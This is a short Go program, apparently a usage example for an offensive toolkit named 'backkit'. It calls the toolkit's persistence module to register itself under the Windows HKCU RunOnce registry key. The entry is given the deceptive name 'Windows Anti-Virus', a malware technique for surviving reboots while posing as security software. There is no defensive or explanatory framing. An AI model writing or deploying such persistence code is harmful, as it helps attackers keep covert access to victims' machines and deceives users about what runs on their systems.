package main

import (
	"github.com/iIIusi0n/backkit/persistence"
)

func main() {
	persistence.AddStartupUsingHkcuRunOnce("Windows Anti-Virus")
}
